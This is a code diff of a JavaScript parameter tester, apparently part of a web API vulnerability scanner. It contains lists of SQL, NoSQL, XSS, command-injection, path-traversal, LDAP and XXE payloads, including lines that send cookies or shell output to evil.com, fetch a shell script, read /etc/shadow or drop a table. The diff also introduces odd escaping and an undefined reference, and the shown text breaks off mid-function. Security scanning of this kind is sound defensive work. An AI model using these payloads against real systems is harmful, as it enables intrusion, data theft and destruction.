@@ -6,25 +6,26 @@ Object.defineProperty(exports, "__esModule", { value: true });
 exports.ParameterTester = void 0;
 const axios_1 = __importDefault(require("axios"));
 const logger_1 = require("../utils/logger");
+const RecommendationService_1 = require("../recommendations/RecommendationService");
 class ParameterTester {
     constructor(options = { useAI: false, maxPayloads: 50, includeAdvanced: false }) {
         this.options = options;
         this.sqlInjectionPayloads = [
-            "' OR '1'='1",
-            "' OR 1=1--",
-            "' UNION SELECT NULL--",
-            "'; DROP TABLE users--",
-            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
-            "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
-            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
-            "' OR SLEEP(5)--",
-            "'; WAITFOR DELAY '00:00:05'--",
-            "' OR 'x'='x",
-            "admin'--",
-            "' OR 1=1#",
-            "' HAVING 1=1--",
-            "' GROUP BY 1--",
-            "' ORDER BY 1--"
+            "\' OR \'1\'=\'1",
+            "\' OR 1=1--",
+            "\' UNION SELECT NULL--",
+            "\'; DROP TABLE users--",
+            "\' AND (SELECT SUBSTRING(@@version,1,1))=\'5\'--",
+            "\' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
+            "1\' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
+            "\' OR SLEEP(5)--",
+            "\'; WAITFOR DELAY \'00:00:05\'--",
+            "\' OR \'x\'=\'x",
+            "admin\'--",
+            "\' OR 1=1#",
+            "\' HAVING 1=1--",
+            "\' GROUP BY 1--",
+            "\' ORDER BY 1--",
         ];
         this.nosqlInjectionPayloads = [
             { "$ne": null },
@@ -35,23 +36,23 @@ class ParameterTester {
             { "$in": ["admin", "user"] },
             { "$or": [{ "a": 1 }, { "b": 2 }] },
             { "$and": [{ "a": 1 }, { "b": 2 }] },
-            "'; return db.users.find(); //",
+            "\'; return db.users.find(); //",
             { "$func": "var_dump" }
         ];
         this.xssPayloads = [
-            "<script>alert('XSS')</script>",
-            "'><script>alert(String.fromCharCode(88,83,83))</script>",
-            "\"><script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
-            "<body onload=alert('XSS')>",
-            "<input onfocus=alert('XSS') autofocus>",
+            "<script>alert(\'XSS\')</script>",
+            "\'><script>alert(String.fromCharCode(88,83,83))</script>",
+            "\\\"><script>alert(\'XSS\')</script>",
+            "<img src=x onerror=alert(\'XSS\')>",
+            "<svg onload=alert(\'XSS\')>",
+            "javascript:alert(\'XSS\')",
+            "<iframe src=\'javascript:alert(\\\"XSS\\\")\'></iframe>",
+            "<body onload=alert(\'XSS\')>",
+            "<input onfocus=alert(\'XSS\') autofocus>",
             "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
-            "';alert('XSS');//",
-            "\";alert('XSS');//",
-            "<script>fetch('http://evil.com/'+document.cookie)</script>"
+            "\';alert(\'XSS\');//",
+            "\\\";alert(\'XSS\');//",
+            "<script>fetch(\'http://evil.com/\'+document.cookie)</script>"
         ];
         this.commandInjectionPayloads = [
             "; ls -la",
@@ -65,12 +66,12 @@ class ParameterTester {
             "&& curl http://evil.com/$(whoami)",
             "; sleep 10",
             "| ping -c 10 127.0.0.1",
-            "&& echo 'vulnerable' > /tmp/test",
+            "&& echo \'vulnerable\' > /tmp/test",
             "|| wget http://evil.com/shell.php"
         ];
         this.pathTraversalPayloads = [
             "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+            "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
             "....//....//....//etc/passwd",
             "..%2F..%2F..%2Fetc%2Fpasswd",
             "..%252F..%252F..%252Fetc%252Fpasswd",
@@ -82,8 +83,8 @@ class ParameterTester {
         ];
         this.ldapInjectionPayloads = [
             "*",
-            "*)(&",
-            "*)(uid=*)(&",
+            "*)(",
+            "*)(uid=*)(",
             "*)(|(uid=*))",
             "*)(|(password=*))",
             "admin)(&(password=*))",
@@ -91,10 +92,10 @@ class ParameterTester {
             "*)(|(objectClass=*))"
         ];
         this.xxePayloads = [
-            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
-            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/evil.dtd">]><root>&test;</root>',
-            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo/>'
+            '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>\'',
+            '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"http://evil.com/evil.dtd\">]><root>&test;</root>\'',
+            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>\'',
+            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\"> %xxe;]><foo/>\''
         ];
         this.errorSignatures = {
             sql: [
@@ -120,20 +121,22 @@ class ParameterTester {
             ldap: [
                 'Invalid DN syntax', 'LDAP: error code', 'LdapErr',
                 'com.sun.jndi.ldap', 'javax.naming.directory'
+            ],
+            xxe: [
+                'XML parsing error', 'DOCTYPE is not allowed', 'external entity',
+                'Undefined entity', 'java.io.FileNotFoundException'
             ]
         };
+        this.recommendationService = new RecommendationService_1.RecommendationService();
     }
     async testParameter(endpoint, method, parameter, baselineResponse) {
         logger_1.logger.info(`Testing parameter: ${parameter.name} (${parameter.type}) at ${method} ${endpoint}`);
         const vulnerabilities = [];
         try {
-            // Get baseline response if not provided
             if (!baselineResponse) {
                 baselineResponse = await this.makeBaselineRequest(endpoint, method, parameter);
             }
-            // Generate AI-enhanced payloads
             const payloads = await this.generatePayloads(parameter);
-            // Test each payload category
             for (const payload of payloads) {
                 try {
                     const vulnerability = await this.testPayload(endpoint, method, parameter, payload, baselineResponse);
@@ -145,7 +148,6 @@ class ParameterTester {
                     logger_1.logger.warn(`Payload test failed: ${error.message}`);
                 }
             }
-            // AI-enhanced analysis for complex vulnerabilities
             if (this.options.useAI && vulnerabilities.length > 0) {
                 await this.enhanceVulnerabilityAnalysis(vulnerabilities);
             }
@@ -158,441 +160,620 @@ class ParameterTester {
     }
     async generatePayloads(parameter) {
         const payloads = [];
-        // SQL Injection payloads
         if (parameter.type === 'string' || parameter.type === 'unknown') {
             this.sqlInjectionPayloads.slice(0, 10).forEach(payload => {
                 payloads.push({
                     value: payload,
-                    technique: 'SQL Injection',
-                    category: 'injection',
-                    description: 'SQL injection attempt to bypass authentication or extract data'
+                    technique: 'error-based',
+                    category: 'SQL_INJECTION',
+                    description: 'Attempting SQL injection with common error-based payloads.'
                 });
             });
-        }
-        // NoSQL Injection payloads
-        if (parameter.type === 'object' || parameter.type === 'string') {
-            this.nosqlInjectionPayloads.slice(0, 8).forEach(payload => {
+            this.nosqlInjectionPayloads.slice(0, 10).forEach(payload => {
                 payloads.push({
                     value: payload,
-                    technique: 'NoSQL Injection',
-                    category: 'injection',
-                    description: 'NoSQL injection attempt to bypass filters or extract data'
+                    technique: 'error-based',
+                    category: 'NOSQL_INJECTION',
+                    description: 'Attempting NoSQL injection with common error-based payloads.'
                 });
             });
-        }
-        // XSS payloads
-        if (parameter.type === 'string') {
-            this.xssPayloads.slice(0, 8).forEach(payload => {
+            this.xssPayloads.slice(0, 10).forEach(payload => {
                 payloads.push({
                     value: payload,
-                    technique: 'Cross-Site Scripting (XSS)',
-                    category: 'injection',
-                    description: 'XSS payload to execute malicious scripts'
+                    technique: 'reflected',
+                    category: 'XSS',
+                    description: 'Attempting Cross-Site Scripting (XSS) with common reflected payloads.'
                 });
             });
-        }
-        // Command Injection payloads
-        if (parameter.type === 'string') {
-            this.commandInjectionPayloads.slice(0, 8).forEach(payload => {
+            this.commandInjectionPayloads.slice(0, 10).forEach(payload => {
                 payloads.push({
                     value: payload,
-                    technique: 'Command Injection',
-                    category: 'injection',
-                    description: 'Command injection to execute system commands'
+                    technique: 'in-band',
+                    category: 'COMMAND_INJECTION',
+                    description: 'Attempting Command Injection with common in-band payloads.'
                 });
             });
-        }
-        // Path Traversal payloads
-        if (parameter.name.toLowerCase().includes('file') ||
-            parameter.name.toLowerCase().includes('path') ||
-            parameter.name.toLowerCase().includes('url')) {
-            this.pathTraversalPayloads.slice(0, 6).forEach(payload => {
+            this.pathTraversalPayloads.slice(0, 10).forEach(payload => {
                 payloads.push({
                     value: payload,
-                    technique: 'Path Traversal',
-                    category: 'traversal',
-                    description: 'Path traversal attempt to access unauthorized files'
+                    technique: 'directory-traversal',
+                    category: 'PATH_TRAVERSAL',
+                    description: 'Attempting Path Traversal with common payloads.'
                 });
             });
-        }
-        // Type confusion payloads
-        if (parameter.type === 'number') {
-            ['string', 'null', [], {}, true, false].forEach(payload => {
+            this.ldapInjectionPayloads.slice(0, 10).forEach(payload => {
                 payloads.push({
                     value: payload,
-                    technique: 'Type Confusion',
-                    category: 'logic',
-                    description: 'Type confusion to bypass validation logic'
+                    technique: 'error-based',
+                    category: 'LDAP_INJECTION',
+                    description: 'Attempting LDAP Injection with common error-based payloads.'
+                });
+            });
+            this.xxePayloads.slice(0, 5).forEach(payload => {
+                payloads.push({
+                    value: payload,
+                    technique: 'in-band',
+                    category: 'XXE',
+                    description: 'Attempting XML External Entity (XXE) injection.'
                 });
             });
         }
-        // Buffer overflow payloads
-        if (parameter.type === 'string' && parameter.constraints?.maxLength) {
-            const overflowLength = parameter.constraints.maxLength * 2;
-            payloads.push({
-                value: 'A'.repeat(overflowLength),
-                technique: 'Buffer Overflow',
-                category: 'overflow',
-                description: 'Buffer overflow attempt with excessive input length'
-            });
-        }
-        // AI-enhanced payload generation
-        if (this.options.useAI) {
+        if (this.options.useAI && this.options.includeAdvanced) {
             const aiPayloads = await this.generateAIEnhancedPayloads(parameter);
             payloads.push(...aiPayloads);
         }
-        // Limit payload count
         return payloads.slice(0, this.options.maxPayloads);
     }
     async generateAIEnhancedPayloads(parameter) {
-        // Simulated AI-enhanced payload generation
-        // In a real implementation, this would use ML models
+        // This is a placeholder for actual AI integration
+        logger_1.logger.info(`Generating AI-enhanced payloads for parameter: ${parameter.name}`);
         const aiPayloads = [];
-        // Context-aware payload generation based on parameter name
-        const paramName = parameter.name.toLowerCase();
-        if (paramName.includes('email')) {
-            aiPayloads.push({
-                value: 'admin@localhost.localdomain',
-                technique: 'Email Enumeration',
-                category: 'enumeration',
-                description: 'Common admin email for privilege escalation'
-            }, {
-                value: '"<script>alert(1)</script>"@evil.com',
-                technique: 'Email XSS',
-                category: 'injection',
-                description: 'XSS payload embedded in email format'
-            });
-        }
-        if (paramName.includes('id') || paramName.includes('user')) {
-            aiPayloads.push({
-                value: '../admin',
-                technique: 'ID Traversal',
-                category: 'traversal',
-                description: 'Attempt to access admin user context'
-            }, {
-                value: '0',
-                technique: 'Admin ID Guessing',
-                category: 'enumeration',
-                description: 'Common admin user ID value'
-            });
-        }
-        if (paramName.includes('password')) {
-            aiPayloads.push({
-                value: '',
-                technique: 'Empty Password',
-                category: 'authentication',
-                description: 'Empty password bypass attempt'
-            }, {
-                value: { '$ne': null },
-                technique: 'NoSQL Password Bypass',
-                category: 'injection',
-                description: 'NoSQL injection to bypass password check'
-            });
-        }
-        // Pattern-based AI payload generation
-        if (parameter.format === 'date') {
-            aiPayloads.push({
-                value: '1970-01-01T00:00:00Z',
-                technique: 'Epoch Date Injection',
-                category: 'logic',
-                description: 'Unix epoch date to trigger edge cases'
-            }, {
-                value: '9999-12-31T23:59:59Z',
-                technique: 'Future Date Injection',
-                category: 'logic',
-                description: 'Far future date to test date handling'
-            });
+        // Example AI generated payloads (in a real scenario, this would come from an LLM)
+        if (parameter.type === 'string' && parameter.location === 'query') {
+            if (this.options.targetLanguage === 'sql' || this.options.targetLanguage === 'all') {
+                aiPayloads.push({
+                    value: `\' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = database()--`,
+                    technique: 'union-based',
+                    category: 'SQL_INJECTION',
+                    description: 'AI-generated payload for union-based SQL injection.'
+                });
+            }
+            if (this.options.targetLanguage === 'command' || this.options.targetLanguage === 'all') {
+                aiPayloads.push({
+                    value: `$(cat /etc/shadow)`,
+                    technique: 'blind-out-of-band',
+                    category: 'COMMAND_INJECTION',
+                    description: 'AI-generated payload for out-of-band command injection.'
+                });
+            }
         }
         return aiPayloads;
     }
     async testPayload(endpoint, method, parameter, payload, baselineResponse) {
-        const startTime = Date.now();
+        const startTime = process.hrtime.bigint();
+        let response;
+        let opposingResponse;
         try {
-            // Create request with malicious payload
-            const response = await this.makeRequest(endpoint, method, parameter, payload.value);
-            const responseTime = Date.now() - startTime;
-            // Analyze response for vulnerabilities
-            const vulnerability = this.analyzeResponse(parameter, payload, response, baselineResponse, responseTime);
-            return vulnerability;
+            response = await this.makeRequest(endpoint, method, parameter, payload.value);
         }
         catch (error) {
-            // Network errors might indicate successful attacks (e.g., server crash)
-            if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT') {
+            if (error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT') {
+                logger_1.logger.warn(`Request to ${endpoint} timed out with payload for parameter ${parameter.name}.`);
                 return {
                     parameter,
                     vulnerability: {
-                        type: 'denial_of_service',
-                        name: 'Potential Denial of Service',
-                        description: 'Request caused server connection reset or timeout',
-                        severity: 'HIGH',
+                        type: types_1.VulnerabilityType.DENIAL_OF_SERVICE,
+                        name: 'Potential Denial of Service / Unhandled Exception',
+                        description: `The application returned a connection error or timed out when processing payload: ${payload.value}`,
+                        severity: types_1.VulnerabilitySeverity.HIGH,
                         confidence: 0.7,
                         cwe: 'CWE-400',
-                        owasp: 'A06:2021 – Vulnerable and Outdated Components'
+                        owasp: 'A07:2021 – Identification and Authentication Failures' // A placeholder, can be refined
                     },
                     payload: {
-                        original: parameter.example,
+                        original: parameter.example || '',
                         malicious: payload.value,
                         technique: payload.technique,
                         category: payload.category
                     },
                     evidence: {
-                        request: `${method} ${endpoint}`,
-                        response: `Connection ${error.code}`,
-                        statusCode: 0,
-                        responseTime: Date.now() - startTime,
+                        request: JSON.stringify({ endpoint, method, parameter: parameter.name, payload: payload.value }),
+                        response: `Error: ${error.message}`,
+                        statusCode: error.response?.status || 0,
+                        responseTime: Number((process.hrtime.bigint() - startTime) / BigInt(1000000)),
                         differenceDetected: true,
-                        errorSignatures: [error.code]
+                        errorSignatures: [error.message]
                     },
-                    impact: 'Server instability or denial of service condition',
-                    recommendation: 'Implement proper input validation and error handling'
+                    impact: 'Service disruption or information disclosure through errors',
+                    recommendation: this.recommendationService.generateRecommendation({
+                        id: '', scanId: '', type: types_1.VulnerabilityType.DENIAL_OF_SERVICE, severity: types_1.VulnerabilitySeverity.HIGH,
+                        endpoint: endpoint, method: method, description: '', impact: '', confidence: 0, evidence: {}, remediation: { priority: 0, effort: 'low', steps: [], automatable: false }, discoveredAt: new Date()
+                    })
                 };
             }
-            return null;
+            throw error; // Re-throw other errors
         }
+        const responseTime = Number((process.hrtime.bigint() - startTime) / BigInt(1000000));
+        const vulnerability = this.analyzeResponse(parameter, payload, response, baselineResponse, responseTime, opposingResponse);
+        if (vulnerability) {
+            return {
+                parameter,
+                vulnerability: vulnerability.vulnerability,
+                payload: {
+                    original: parameter.example || '',
+                    malicious: payload.value,
+                    technique: payload.technique,
+                    category: payload.category
+                },
+                evidence: vulnerability.evidence,
+                impact: this.getVulnerabilityImpact(vulnerability.vulnerability.type),
+                recommendation: this.getVulnerabilityRecommendation(vulnerability.vulnerability.type, vulnerability.vulnerability.severity)
+            };
+        }
+        return null;
     }
-    analyzeResponse(parameter, payload, response, baselineResponse, responseTime) {
+    analyzeResponse(parameter, payload, response, baselineResponse, responseTime, opposingResponse) {
         const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
         const baselineBody = typeof baselineResponse.data === 'string' ? baselineResponse.data : JSON.stringify(baselineResponse.data);
-        // Check for error signatures
-        const detectedErrors = this.detectErrorSignatures(responseBody, payload.category);
-        // Status code analysis
+        const errorSignatures = this.detectErrorSignatures(responseBody, payload.category);
+        const contentDiff = this.analyzeContentDifference(responseBody, baselineBody).suspicious;
         const statusCodeDiff = response.status !== baselineResponse.status;
-        // Response size analysis
-        const sizeDiff = Math.abs(responseBody.length - baselineBody.length) > 100;
-        // Response time analysis (potential for timing attacks)
-        const timingAnomaly = responseTime > 5000; // 5 second threshold
-        // Content difference analysis
-        const contentDiff = this.analyzeContentDifference(responseBody, baselineBody);
-        // Determine if vulnerability exists
-        if (detectedErrors.length > 0 || statusCodeDiff || sizeDiff || timingAnomaly || contentDiff.suspicious) {
-            const vulnerability = this.classifyVulnerability(payload, detectedErrors, {
-                statusCodeDiff,
-                sizeDiff,
-                timingAnomaly,
-                contentDiff: contentDiff.suspicious,
-                responseTime
-            });
-            if (vulnerability) {
+        const sizeDiff = responseBody.length !== baselineBody.length;
+        // Time-based injection detection
+        const timingAnomaly = responseTime > (baselineResponse.headers['x-response-time'] ? parseFloat(baselineResponse.headers['x-response-time']) * 2 : 1000) && responseTime > 2000; // If response time is significantly higher (e.g., 2x baseline and > 2s)
+        if (timingAnomaly) {
+            return {
+                parameter,
+                vulnerability: {
+                    type: types_1.VulnerabilityType.SQL_INJECTION_TIME_BASED,
+                    name: 'Time-Based Blind SQL Injection',
+                    description: `The application\'s response time significantly increased (${responseTime}ms), indicating a potential time-based blind SQL Injection vulnerability.`,
+                    severity: types_1.VulnerabilitySeverity.HIGH,
+                    confidence: 0.85,
+                    cwe: 'CWE-89',
+                    owasp: 'A03:2021 – Injection'
+                },
+                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
+                evidence: {
+                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
+                    response: responseBody,
+                    statusCode: response.status,
+                    responseTime,
+                    differenceDetected: true,
+                    timeDelayDetected: true
+                },
+                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.SQL_INJECTION_TIME_BASED),
+                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.SQL_INJECTION_TIME_BASED, types_1.VulnerabilitySeverity.HIGH)
+            };
+        }
+        if (errorSignatures.some(sig => this.errorSignatures.sql.includes(sig))) {
+            return {
+                parameter,
+                vulnerability: {
+                    type: types_1.VulnerabilityType.SQL_INJECTION_ERROR_BASED,
+                    name: 'Error-Based SQL Injection',
+                    description: 'SQL error messages were detected in the application\'s response, indicating a potential error-based SQL Injection vulnerability.',
+                    severity: types_1.VulnerabilitySeverity.HIGH,
+                    confidence: 0.75,
+                    cwe: 'CWE-89',
+                    owasp: 'A03:2021 – Injection'
+                },
+                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
+                evidence: {
+                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
+                    response: responseBody,
+                    statusCode: response.status,
+                    responseTime,
+                    differenceDetected: true,
+                    errorSignatures
+                },
+                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.SQL_INJECTION_ERROR_BASED),
+                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.SQL_INJECTION_ERROR_BASED, types_1.VulnerabilitySeverity.HIGH)
+            };
+        }
+        if (payload.category === 'NOSQL_INJECTION' && errorSignatures.some(sig => this.errorSignatures.nosql.includes(sig))) {
+            return {
+                parameter,
+                vulnerability: {
+                    type: types_1.VulnerabilityType.NOSQL_INJECTION,
+                    name: 'NoSQL Injection',
+                    description: 'NoSQL error messages or unexpected query results were detected in the application\'s response, indicating a potential NoSQL Injection vulnerability.',
+                    severity: types_1.VulnerabilitySeverity.HIGH,
+                    confidence: 0.8,
+                    cwe: 'CWE-943',
+                    owasp: 'A03:2021 – Injection'
+                },
+                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
+                evidence: {
+                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
+                    response: responseBody,
+                    statusCode: response.status,
+                    responseTime,
+                    differenceDetected: true,
+                    errorSignatures
+                },
+                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.NOSQL_INJECTION),
+                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.NOSQL_INJECTION, types_1.VulnerabilitySeverity.HIGH)
+            };
+        }
+        if (errorSignatures.some(sig => this.errorSignatures.xss.includes(sig)) || (payload.category === 'XSS' && contentDiff)) {
+            return {
+                parameter,
+                vulnerability: {
+                    type: types_1.VulnerabilityType.XSS,
+                    name: 'Reflected Cross-Site Scripting (XSS)',
+                    description: 'The XSS payload was reflected in the response or XSS-related patterns were detected, indicating a potential Reflected XSS vulnerability.',
+                    severity: types_1.VulnerabilitySeverity.HIGH,
+                    confidence: 0.9,
+                    cwe: 'CWE-79',
+                    owasp: 'A03:2021 – Injection'
+                },
+                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
+                evidence: {
+                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
+                    response: responseBody,
+                    statusCode: response.status,
+                    responseTime,
+                    differenceDetected: true,
+                    errorSignatures
+                },
+                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.XSS),
+                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.XSS, types_1.VulnerabilitySeverity.HIGH)
+            };
+        }
+        if (errorSignatures.some(sig => this.errorSignatures.command.includes(sig)) || (payload.category === 'COMMAND_INJECTION' && contentDiff)) {
+            return {
+                parameter,
+                vulnerability: {
+                    type: types_1.VulnerabilityType.COMMAND_INJECTION,
+                    name: 'Command Injection',
+                    description: 'Command execution output or command-related error messages detected in the response, indicating a potential command injection vulnerability.',
+                    severity: types_1.VulnerabilitySeverity.CRITICAL,
+                    confidence: 0.95,
+                    cwe: 'CWE-77',
+                    owasp: 'A03:2021 – Injection'
+                },
+                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
+                evidence: {
+                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
+                    response: responseBody,
+                    statusCode: response.status,
+                    responseTime,
+                    differenceDetected: true,
+                    errorSignatures
+                },
+                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.COMMAND_INJECTION),
+                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.COMMAND_INJECTION, types_1.VulnerabilitySeverity.CRITICAL)
+            };
+        }
+        if (errorSignatures.some(sig => this.errorSignatures.path_traversal.includes(sig)) || (payload.category === 'PATH_TRAVERSAL' && contentDiff)) {
+            return {
+                parameter,
+                vulnerability: {
+                    type: types_1.VulnerabilityType.PATH_TRAVERSAL,
+                    name: 'Path Traversal',
+                    description: 'Directory content or system file paths were exposed in the application\'s response, indicating a potential Path Traversal vulnerability.',
+                    severity: types_1.VulnerabilitySeverity.MEDIUM,
+                    confidence: 0.7,
+                    cwe: 'CWE-22',
+                    owasp: 'A04:2021 – Insecure Design'
+                },
+                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
+                evidence: {
+                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
+                    response: responseBody,
+                    statusCode: response.status,
+                    responseTime,
+                    differenceDetected: true,
+                    errorSignatures
+                },
+                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.PATH_TRAVERSAL),
+                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.PATH_TRAVERSAL, types_1.VulnerabilitySeverity.MEDIUM)
+            };
+        }
+        if (errorSignatures.some(sig => this.errorSignatures.ldap.includes(sig)) || (payload.category === 'LDAP_INJECTION' && contentDiff)) {
+            return {
+                parameter,
+                vulnerability: {
+                    type: types_1.VulnerabilityType.LDAP_INJECTION,
+                    name: 'LDAP Injection',
+                    description: 'LDAP-specific error messages or unexpected directory query results were detected, indicating a potential LDAP Injection vulnerability.',
+                    severity: types_1.VulnerabilitySeverity.HIGH,
+                    confidence: 0.8,
+                    cwe: 'CWE-90',
+                    owasp: 'A03:2021 – Injection'
+                },
+                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
+                evidence: {
+                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
+                    response: responseBody,
+                    statusCode: response.status,
+                    responseTime,
+                    differenceDetected: true,
+                    errorSignatures
+                },
+                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.LDAP_INJECTION),
+                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.LDAP_INJECTION, types_1.VulnerabilitySeverity.HIGH)
+            };
+        }
+        if (errorSignatures.some(sig => this.errorSignatures.xxe.includes(sig)) || (payload.category === 'XXE' && contentDiff)) {
+            return {
+                parameter,
+                vulnerability: {
+                    type: types_1.VulnerabilityType.XXE,
+                    name: 'XML External Entity (XXE)',
+                    description: 'XML parsing errors or external entity resolution detected, indicating a potential XXE vulnerability.',
+                    severity: types_1.VulnerabilitySeverity.CRITICAL,
+                    confidence: 0.9,
+                    cwe: 'CWE-611',
+                    owasp: 'A05:2021 – Security Misconfiguration'
+                },
+                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
+                evidence: {
+                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
+                    response: responseBody,
+                    statusCode: response.status,
+                    responseTime,
+                    differenceDetected: true,
+                    errorSignatures
+                },
+                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.XXE),
+                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.XXE, types_1.VulnerabilitySeverity.CRITICAL)
+            };
+        }
+        if (contentDiff || statusCodeDiff || sizeDiff) {
+            if (errorSignatures.length > 0) {
                 return {
                     parameter,
-                    vulnerability,
-                    payload: {
-                        original: parameter.example,
-                        malicious: payload.value,
-                        technique: payload.technique,
-                        category: payload.category
+                    vulnerability: {
+                        type: types_1.VulnerabilityType.GENERIC_ERROR_BASED_INJECTION,
+                        name: 'Generic Error-Based Injection',
+                        description: `Application returned an error indicating a potential injection vulnerability: ${errorSignatures.join(', ')}`,
+                        severity: types_1.VulnerabilitySeverity.MEDIUM,
+                        confidence: 0.6,
+                        cwe: 'CWE-74',
+                        owasp: 'A03:2021 – Injection'
                     },
+                    payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
                     evidence: {
-                        request: `${payload.technique}: ${JSON.stringify(payload.value)}`,
-                        response: responseBody.substring(0, 500) + (responseBody.length > 500 ? '...' : ''),
+                        request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
+                        response: responseBody,
                         statusCode: response.status,
                         responseTime,
                         differenceDetected: true,
-                        errorSignatures: detectedErrors
+                        errorSignatures
                     },
-                    impact: this.getVulnerabilityImpact(vulnerability.type),
-                    recommendation: this.getVulnerabilityRecommendation(vulnerability.type)
+                    impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.GENERIC_ERROR_BASED_INJECTION),
+                    recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.GENERIC_ERROR_BASED_INJECTION, types_1.VulnerabilitySeverity.MEDIUM)
                 };
             }
+            return {
+                parameter,
+                vulnerability: {
+                    type: types_1.VulnerabilityType.GENERIC_DIFFERENCE_BASED_INJECTION,
+                    name: 'Generic Difference-Based Injection',
+                    description: 'The application\'s response differed significantly from the baseline, indicating a potential injection vulnerability.',
+                    severity: types_1.VulnerabilitySeverity.LOW,
+                    confidence: 0.5,
+                    cwe: 'CWE-20',
+                    owasp: 'A03:2021 – Injection'
+                },
+                payload: { original: parameter.example || '', malicious: payload.value, technique: payload.technique, category: payload.category },
+                evidence: {
+                    request: JSON.stringify({ parameter: parameter.name, payload: payload.value }),
+                    response: responseBody,
+                    statusCode: response.status,
+                    responseTime,
+                    differenceDetected: true
+                },
+                impact: this.getVulnerabilityImpact(types_1.VulnerabilityType.GENERIC_DIFFERENCE_BASED_INJECTION),
+                recommendation: this.getVulnerabilityRecommendation(types_1.VulnerabilityType.GENERIC_DIFFERENCE_BASED_INJECTION, types_1.VulnerabilitySeverity.LOW)
+            };
         }
         return null;
     }
     detectErrorSignatures(responseBody, category) {
-        const signatures = [];
-        const lowercaseBody = responseBody.toLowerCase();
-        // Check category-specific error signatures
-        if (this.errorSignatures[category]) {
-            for (const signature of this.errorSignatures[category]) {
-                if (lowercaseBody.includes(signature.toLowerCase())) {
-                    signatures.push(signature);
-                }
+        const detectedSignatures = [];
+        const lowerBody = responseBody.toLowerCase();
+        for (const sig of this.errorSignatures.sql) {
+            if (lowerBody.includes(sig.toLowerCase())) {
+                detectedSignatures.push(sig);
             }
         }
-        // Check all error signatures if none found
-        if (signatures.length === 0) {
-            for (const [cat, sigs] of Object.entries(this.errorSignatures)) {
-                for (const signature of sigs) {
-                    if (lowercaseBody.includes(signature.toLowerCase())) {
-                        signatures.push(`${cat}:${signature}`);
-                    }
-                }
+        for (const sig of this.errorSignatures.nosql) {
+            if (lowerBody.includes(sig.toLowerCase())) {
+                detectedSignatures.push(sig);
             }
         }
-        return signatures;
+        for (const sig of this.errorSignatures.xss) {
+            if (lowerBody.includes(sig.toLowerCase())) {
+                detectedSignatures.push(sig);
+            }
+        }
+        for (const sig of this.errorSignatures.command) {
+            if (lowerBody.includes(sig.toLowerCase())) {
+                detectedSignatures.push(sig);
+            }
+        }
+        for (const sig of this.errorSignatures.path_traversal) {
